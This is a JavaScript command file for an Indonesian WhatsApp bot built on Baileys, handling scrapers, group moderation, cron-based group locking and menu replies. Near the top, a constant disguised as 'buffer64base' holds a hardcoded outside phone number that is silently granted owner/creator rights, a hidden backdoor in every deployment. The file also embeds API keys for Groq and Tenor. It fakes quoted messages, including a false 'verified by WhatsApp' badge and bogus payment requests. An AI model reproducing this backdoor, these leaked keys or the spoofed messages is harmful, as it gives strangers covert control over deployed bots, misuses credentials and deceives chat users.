process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const FormData = require("form-data");
const cron = require('node-cron')
const os = require('os');
const googleTTS = require('google-tts-api');
const { say } = require("cfonts");
const pino = require('pino');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, S_WHATSAPP_NET } = require('@whiskeysockets/baileys')

let autowan = JSON.parse(fs.readFileSync('./database/autowan.json'))
const salamm = fs.readFileSync("./src/mp3/salam.mp3")
const helo = fs.readFileSync("./src/mp3/helo.mp3")
const groupId = '120363357804717883@g.us';
const prem = require("./lib/premium");
const config = require("./settings.js");
const Func = require("./lib/function");
const { LoadDataBase } = require('./src/message');
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
const list = JSON.parse(fs.readFileSync("./database/list.json"))
const { pinterest, pinterest2, remini, rmbg, tiktokDl } = require('./lib/scraper')
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./lib/function');


module.exports = xyu = async (xyu, m, chatUpdate, store) => {
	try {
await LoadDataBase(xyu, m)
const { type, quotedMsg } = m
const from = m.key.remoteJid
const botNumber = await xyu.decodeJid(xyu.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const buffer64base = "6283176305101@s.whatsapp.net";
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const isPremium = isCreator ? true : prem.checkPremiumUser(m.sender, premium)
const sender = m.key.fromMe ? (xyu.user.id.split(':')[0]+'@s.whatsapp.net' || xyu.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const text = q = args.join(' ')
const qtod = m.quoted? "true":"false"
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
const groupMetadata = m.isGroup ? await xyu.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const isGroup = m.key.remoteJid.endsWith('@g.us')
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
const nomore = m.sender.replace(/[^0-9]/g, '')

const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const mentss = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}
const ments = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}

try {
ppuser = await xyu.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://files.catbox.moe/0arg0u.jpg'
}
ppnyauser = await getBuffer(ppuser)

const ytime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
const ydate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var waktuucapan = 'Selamat Malam 🌃'
}
if(time2 < "19:00:00"){
var waktuucapan = 'Selamat Petang 🌆'
}
if(time2 < "18:00:00"){
var waktuucapan = 'Selamat Sore 🌅'
}
if(time2 < "15:00:00"){
var waktuucapan = 'Selamat Siang 🏙'
}
if(time2 < "10:00:00"){
var waktuucapan = 'Selamat Pagi 🌄'
}
if(time2 < "05:00:00"){
var waktuucapan = 'Selamat Subuh 🌉'
}
if(time2 < "03:00:00"){
var waktuucapan = 'Tengah Malam 🌌'
}
//============== [ MESSAGE ] ================================================
if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

if (isCmd) {
console.log(chalk.cyan.bold(` ╭─────[ COMMAND NOTIFICATION ]`), chalk.blue.bold(`\n  Command :`), chalk.white.bold(`${prefix+command}`), chalk.blue.bold(`\n  From :`), chalk.white.bold(m.isGroup ? `Group - ${m.sender.split("@")[0]}\n` : m.sender.split("@")[0] +`\n`), chalk.cyan.bold(`╰────────────────────────────\n`))
}

//============= [ FAKEQUOTED ] ===============================================
const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}

const verif = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`,
remoteJid: "status@broadcast" 
},
'message': {
extendedTextMessage: {
text: "_Takashi - Botz Telah Terverifikasi Oleh WhatsApp_"
}
}
};


function randomNomor(min, max = null){
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}}

async function edit2 (tex1, tex2) {
var nln = [
`${tex1}`,
`${tex2}`
]
let { key } = await xyu.sendMessage(from, {text: 'Loading...'},  { quoted: m })
let duh = randomNomor(800, 1000)
for (let i = 0; i < nln.length; i++) {
await sleep(duh)
await xyu.sendMessage(from, {text: nln[i], edit: key }, { quoted: m });
}}

const users = global.db.users

const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
    const fkethmb = await reSize(ppuser, 300, 300)
    // function resize
    let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

const sendReaction = async reactionContent => {
  xyu.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

//============= [ EVENT GROUP ] ===============================================
if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await xyu.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await xyu.sendMessage(m.chat, {text: `*乂 [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await xyu.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await xyu.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].antitoxic === true) {
    const toxicWords = /\b(mmk|kntl|anjg|anj|Anj|anjing|Anjing|tol|Tol|tolol|Tolol|kon|Kon|kontol|Kontol|bajingan|Bajingan|babi|Babi|goblok|Goblok|idiot|Idiot|sialan|Sialan|kontolan|Kontolan|brengsek|Brengsek|jancok|Jancok|asu|Asu|setan|Setan|bangsat|Bangsat|bacot|Bacot|perek|Perek|pler|Pler|gblk|Gblk|ajg|Ajg|memek|Memek|puki|Puki|ngtd|Ngtd|bokep|Bokep|bokp|Bokp|fuck|Fuck|ngentot|Ngentot|lonte|Lonte|kimak|Kimak|pantek|Pantek|pukimak|Pukimak|pepek|Pepek|coli|Coli|ewe|Ewe|bejat|Bejat|kampang|Kampang|telek|Telek|bacod|Bacod|tai|Tai|monyet|Monyet|Bego|bego)\b/i;

    // Jika pesan mengandung kata toxic
    if (toxicWords.test(m.text)) {
        // Jika pengirim adalah admin atau kreator, jangan hapus
        if (m.isAdmin || isCreator) {
            await xyu.sendMessage(
                m.chat, 
                {
                    text: `Atmin mah gpp toxic😹`, 
                    contextInfo: { mentionedJid: [m.sender] }
                }
            );
            return;
        }

        // Kirim balasan dalam bentuk pesan suara
        await xyu.sendMessage(
            m.chat, 
            {
                audio: fs.readFileSync('./src/mp3/toxic.mp3'), 
                mimetype: 'audio/mpeg', 
                ptt: true
            }, 
            { quoted: m }
        );

        // Hapus pesan toxic
        await xyu.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant
            }
        });
    }
}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await xyu.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await xyu.sendMessage(m.chat, {text: `*乂 [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await xyu.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await xyu.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}

if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}
}




//============= [ FUNCTION ] ======================================================

async function ephoto(url, texk) {
      let form = new FormData();
      let gT = await axios.get(url, {
        headers: {
          'user-agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
        },
      });
      let $ = cheerio.load(gT.data);
      let text = texk;
      let token = $('input[name=token]').val();
      let build_server = $('input[name=build_server]').val();
      let build_server_id = $('input[name=build_server_id]').val();
      form.append('text[]', text);
      form.append('token', token);
      form.append('build_server', build_server);
      form.append('build_server_id', build_server_id);
      let res = await axios({
        url: url,
        method: 'POST',
        data: form,
        headers: {
          Accept: '*/*',
          'Accept-Language': 'en-US,en;q=0.9',
          'user-agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
          cookie: gT.headers['set-cookie']?.join('; '),
          ...form.getHeaders(),
        },
      });
      let $$ = cheerio.load(res.data);
      let json = JSON.parse($$('input[name=form_value_input]').val());
      json['text[]'] = json.text;
      delete json.text;
      let { data } = await axios.post(
        'https://en.ephoto360.com/effect/create-image',
        new URLSearchParams(json),
        {
          headers: {
            'user-agent':
              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
            cookie: gT.headers['set-cookie'].join('; '),
          },
        }
      );
      return build_server + data.image;
    }

async function pepe(media) {
    const jimpImage = await jimp.read(media);
    const min = Math.min(jimpImage.getWidth(), jimpImage.getHeight());
    const cropped = jimpImage.crop(0, 0, min, min);
    return {
        img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp.MIME_JPEG),
        preview: await cropped.normalize().getBufferAsync(jimp.MIME_JPEG),
    };
}

async function sendButton(jid, teks1) {
let msg = generateWAMessageFromContent(jid, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: teks1
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By Xyuraa`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
									{
										"name": "cta_reminder",
										"buttonParamsJson": `{\"display_text\":\"Pengingat Hari Kiamat\",\"id\":\"message\"}`
									},
																		{
										"name": "cta_url",
										"buttonParamsJson": `{\"display_text\":\"Group!!\",\"url\":\"https://chat.whatsapp.com/EUvs6YzVtm19NUUpiDCoxD",\"merchant_url\":\"https://www.google.com\"}`
									},
																		{
										"name": "cta_url",
										"buttonParamsJson": `{\"display_text\":\"Saluran!!\",\"url\":\"https://whatsapp.com/channel/0029VaqBRU9ATRSkHSEfND1w\",\"merchant_url\":\"https://www.google.com\"}`
									}
],
}),
contextInfo: {
externalAdReply: {
                    showAdAttribution: true,
                    mediaType: 2,
                    mediaUrl: `http://wa.me/6283176305101/${Math.floor(Math.random() * 100000000000000000)}`,
                    title: `Hai ${pushname}`,
                    body: `Created by ${ownername}`,
                    sourceUrl: "",
                    thumbnail: fkethmb
}
}})}}
}, {quoted: m})
await xyu.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
})
}
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

function monospace(string) {
return '```' + string + '```'
}

async function uploadToCatbox(filePath) {
            const form = new FormData();
            form.append('fileToUpload', fs.createReadStream(filePath)); // file yang diupload
            form.append('reqtype', 'fileupload'); // reqtype harus "fileupload"
          
            try {
              const response = await axios.post('https://catbox.moe/user/api.php', form, {
                headers: {
                  ...form.getHeaders(),
                },
              });
          
              if (response.data) {
                // Ambil hanya nama file yang diunggah
                const filename = response.data.trim();
                return `${filename}`;
              } else {
                throw new Error('Gagal mendapatkan URL dari Catbox.');
              }
            } catch (error) {
              console.error('Error uploading to Catbox:', error.message);
              throw error;
            }
          }

async function dellCase(filePath, caseNameToRemove) {
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan:', err);
            return;
        }
        const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
        const modifiedData = data.replace(regex, '');

        fs.writeFile(filePath, modifiedData, 'utf8', (err) => {
            if (err) {
                console.error('Terjadi kesalahan saat menulis file:', err);
                return;
            }
            console.log(`Teks dari case '${caseNameToRemove}' telah dihapus dari file.`);
        });
    });
}

const example = (teks) => {
return `\n *Contoh Penggunaan :*\n Ketik *${prefix+command}* ${teks}\n`
}



function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return xyu.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `${botname}`, newsletterJid: global.idSaluran }, 
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: null})
}

async function replymenu(wow) {
    xyu.sendMessage(
         m.chat,
{
         document: fs.readFileSync("./package.json"),
         fileName: `Haii ${pushname}`,
         fileLength: "99999999999999",
         caption: wow,
         mimetype: "image/png",
         headerType: 9,
         jpegThumbnail: fkethmb,
        caption: wow,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: false,
            mentionedJid: [sender],
            forwardedNewsletterMessageInfo: {
                newsletterName: "xʏᴜʀᴀ -ᴍᴏᴅs",
                newsletterJid: "120363324795151892@newsletter",
            },
            externalAdReply: {  
                title: global.foter, 
                body: '©𝐓𝐚𝐤𝐚𝐬𝐡𝐢 - 𝐁𝐨𝐭𝐳',
                thumbnail: fs.readFileSync("./src/media/thumb.jpg"), // Menggunakan path lokal
                sourceUrl: global.url, 
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: verif });
}

const totalFitur = () =>{
var mytext = fs.readFileSync("case.js").toString()
var numUpper = (mytext.match(/case '/g) || []).length;
return numUpper
}

const reply = (teks) => {
            xyu.sendMessage(m.chat,
{
    text: teks,
    contextInfo: {
        mentionedJid: [sender],
        forwardingScore: 9999999,
        isForwarded: false,
        "externalAdReply": {
            "showAdAttribution": false,
            "containsAutoReply": true,
            "title": `Ｘｙｕｒａ - ｍｏｄｓ`,
            "body": `☣︎ᵛᶦʳᵘˢ☣︎`,
            "previewType": "PHOTO",
            "thumbnailUrl": ``,
            "thumbnail": fs.readFileSync(`./src/media/thumb.jpg`),
            "sourceUrl": `https://taplink.cc/xyuraa`
        }
    }
},
{ quoted: verif })
        }

const pluginsLoader = async (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(file => {
const filePath = path.join(directory, file)
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath]
}
const plugin = require(filePath)
plugins.push(plugin)
} catch (error) {
console.log(`Error loading plugin at ${filePath}:`, error)
}}
})
return plugins
}


//========= [ COMMANDS PLUGINS ] =================================================
let pluginsDisable = true;
const plugins = await pluginsLoader(path.resolve(__dirname, "plugins"));
const xyuradev = { xyu, toIDR, pushname, Func, sendButton, isCreator, reply, Reply, command, isPremium, capital, isCmd, example, text, runtime, qtext, qlocJpm, qmsg, mime, args, sleep, botNumber };

for (let plugin of plugins) {
  // don delete may we em 😂
  if (Array.isArray(plugin.command) && plugin.command.find(e => e == command.toLowerCase())) {
    pluginsDisable = false;
    if (typeof plugin !== "function") return;
    await plugin(m, xyuradev);
  }
}

if (!pluginsDisable) return;
//============= [ COMMANDS ] ====================================================

// animasi loading

async function loading () {
var aurelmaxyu = [
"⌛10%",
"⏳30%",
"⌛50%",
"⏳80%",
"⌛100%",
"Loading Selesai..."
]
let { key } = await xyu.sendMessage(m.chat, {text: 'ʟᴏᴀᴅɪɴɢ...'})//Pengalih isu

for (let i = 0; i < aurelmaxyu.length; i++) {
/*await delay(10)*/
await xyu.sendMessage(m.chat, {text: aurelmaxyu[i], edit: key });//PESAN LEPAS
}
}

if (command && !isGroup && !isCreator && !isPremium) {
    return reply(`haii kak ${pushname} silakan bergabung ke grup ini untuk menggunakan bot: https://chat.whatsapp.com/KVbM5D5cTMt0jcXNnUqflR`);
}
if (!xyu.public) {
if (!isOwner && !m.key.fromMe) return
        }



//============= [ Settings ] ===================================================<
	    

let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
		for (let jid of mentionUser) {
			let user = db.users[jid]
			if (!user) continue
			let afkTime = user.afkTime
			if (!afkTime || afkTime < 0) continue
			let reason = user.afkReason || ''
			m.reply(`Jangan tag dia!\nDia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}\nSelama ${clockString(new Date - afkTime)}`.trim())
		}
		if (db.users[m.sender].afkTime > -1) {
			let user = db.users[m.sender]
			m.reply(`@${m.sender.split('@')[0]} berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}\nSelama ${clockString(new Date - user.afkTime)}`)
			user.afkTime = -1
			user.afkReason = ''
		}
		

// Tutup grup pada pukul 22:00
cron.schedule('0 0 22 * * *', async () => {
    const groupMetadata = await xyu.groupMetadata(groupId);
    if (!groupMetadata.announce) {
        let text = '*[ System Notice ]* Group Di Tutup Secara Otomatis';
        await xyu.groupSettingUpdate(groupId, 'announcement');
        await xyu.sendMessage(groupId, { text: text }, { ephemeralExpiration: 0 });
    }
}, { scheduled: true, timezone: 'Asia/Jakarta' });

cron.schedule('0 0 6 * * *', async () => {
const getGroups = await xyu.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let text = '*[ System Notice ]* Sistem secara otomatis membuka grup ini karena pagi hari.'
if (groups.some(v => v === from) && (await xyu.groupMetadata(from)).announce) {
xyu.groupSettingUpdate(from, 'not_announcement');
xyu.sendMessage(from, {text: text, mentions: Object.values(global.db.groups[from].member).map(v => v.id)}, {ephemeralExpiration: m.expiration});
xyu.groupRequestParticipantsList(from).then(async (data) => {
if (data.length === 0) return
for (let i of data) {
await xyu.groupRequestParticipantsUpdate(from, [i.jid], 'approve')
await delay(1000)
}
})
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })



if (body.match(`@${global.owner.split('@')[0]}`)) {
      m.reply('*𝗃𝖺𝗇𝗀𝖺𝗇 𝗍𝖺𝗀 𝗈𝗐𝗇𝖾𝗋𝗄𝗎, 𝗄𝖺𝗅𝗈 𝖺𝖽𝖺 𝖺𝗉𝖺 𝖺𝗉𝖺 𝖼𝗁𝖺𝗍 𝗉𝗋𝗂𝗏𝖺𝗍𝖾 𝖺𝗃𝖺🗿*')
}
/*

if (budy.includes('@6285640230683')) {
  const q = budy.replace('@6285640230683', '').trim();
  if (q) {
try {
const Groq = require("groq-sdk");
const groq = new Groq({ apiKey: "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" });
async function main(teks) {
  const completion = await groq.chat.completions
    .create({
      messages: [
        {
          role: "user",
          content: teks
        },
      ],
      model: "mixtral-8x7b-32768",
    })
    .then((chatCompletion) => {
      m.reply(chatCompletion.choices[0]?.message?.content || "");
    });
}
return main(text);
    } catch (error) {
      m.reply("aku gapapa kok.");
    }
  } else {
    m.reply("apasiii kamu??");
  }
}*/

//===============================================================================


switch (command) {


case 'bukalapak':{
//wm senn
async function BukaLapak(search) {
  return new Promise(async (resolve, reject) => {
    try {
      const { data } = await axios.get(`https://www.bukalapak.com/products?from=omnisearch&from_keyword_history=false&search[keywords]=${search}&search_source=omnisearch_keyword&source=navbar`, {
        headers: {
          "user-agent": 'Mozilla/ 5.0(Windows NT 10.0; Win64; x64; rv: 108.0) Gecko / 20100101 Firefox / 108.0'
        }
      })
//wm senn
      const $ = cheerio.load(data);
      const dat = [];
      const b = $('a.slide > img').attr('src');
      $('div.bl-flex-item.mb-8').each((i, u) => {
        const a = $(u).find('observer-tracker > div > div');
//wm senn
        const img = $(a).find('div > a > img').attr('src');
        if (typeof img === 'undefined') return

        const link = $(a).find('.bl-thumbnail--slider > div > a').attr('href');
//wm senn
        const title = $(a).find('.bl-product-card__description-name > p > a').text().trim();
        const harga = $(a).find('div.bl-product-card__description-price > p').text().trim();
//wm senn
        const rating = $(a).find('div.bl-product-card__description-rating > p').text().trim();
        const terjual = $(a).find('div.bl-product-card__description-rating-and-sold > p').text().trim();
//wm senn
//wm senn
        const dari = $(a).find('div.bl-product-card__description-store > span:nth-child(1)').text().trim();
        const seller = $(a).find('div.bl-product-card__description-store > span > a').text().trim();
//wm senn 
        const link_sel = $(a).find('div.bl-product-card__description-store > span > a').attr('href');
//wm senn
//wm senn 
        const res_ = {
          title: title,
          rating: rating ? rating : 'No rating yet',
          terjual: terjual ? terjual : 'Not yet bought',
          harga: harga,
          image: img,
          link: link,
          store: {
            lokasi: dari,
            nama: seller,
            link: link_sel
          }
        };

        dat.push(res_);
      })
//wm senn
      if (dat.every(x => x === undefined)) return resolve({ developer: '@xorizn', mess: 'no result found' })
      resolve(dat)
    } catch (err) {
//wm senn
      console.error(err)
    }
  })
}
//wm senn
if (!text) return m.reply('```Masukan nama item yang ingin di cari!!\n```')
m.reply(mess.wait)
let results = await BukaLapak(text)
//wm senn
if (results.length > 0) {
let message = `Hasil pencarian untuk <${text}>\n\n`;
//wm senn
results.forEach((result, index) => {
message += `*${index + 1}.* *${result.title}*\nHarga : ${result.harga}\nRating : ${result.rating}\nStore : ${result.store.nama}\nLokasi : ${result.store.lokasi}\nTerjual : ${result.terjual}\nLink : ${result.link}\n\n`;
 });
//wm senn
xyu.sendMessage(m.chat, { image: { url: results[0].image}, caption: message }, { quoted: m })
//wm senn
 } else {
m.reply('Nama item yang anda berikan tidak ada.');
}
//wm senn
}
break
case 'videy': case 'videydl':{
    if (!text) return m.reply("mana linknya?");
    
    await xyu.sendMessage(m.chat, { react: { text: "🕐", key: m.key } });
    
    var anu = text.replace("v?id=", "");
    var dompResult = anu.replace("https://", "https://cdn.");
    
    xyu.sendMessage(m.chat, { 
        video: { url: dompResult + ".mp4" }, 
        caption: '```Success...\nDont forget to donate```' 
    }, { quoted: verif });
    
}
break
case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) return reply(`Example : ${prefix + command} 😅+🤔`)
		if (!emoji2) return reply(`Example : ${prefix + command} 😅+🤔`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await xyu.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    
		}
	    }
	    break

case "script": 
case "sc":
    xyu.relayMessage(m.chat, {
        "requestPaymentMessage": {
            amount: { 
                value: 2022000,
                offset: 0,
                currencyCode: 'IDR'
            },
            amount1000: 55000000,
            background: null,
            currencyCodeIso4217: 'USD',
            expiryTimestamp: 0,
            noteMessage: {
                extendedTextMessage: {
                    text: `
Hay Kak ${pushname} 👋
${waktuucapan}

Script nya di bawah ini ya ⬇️ :
https://github.com/Xyuraa/Takashi-Botz.git

> jangan lupa kasih bintang ya!! 
•-------------------------------------------------•`
                }
            },
            requestFrom: m.sender
        }
    }, 
    {});

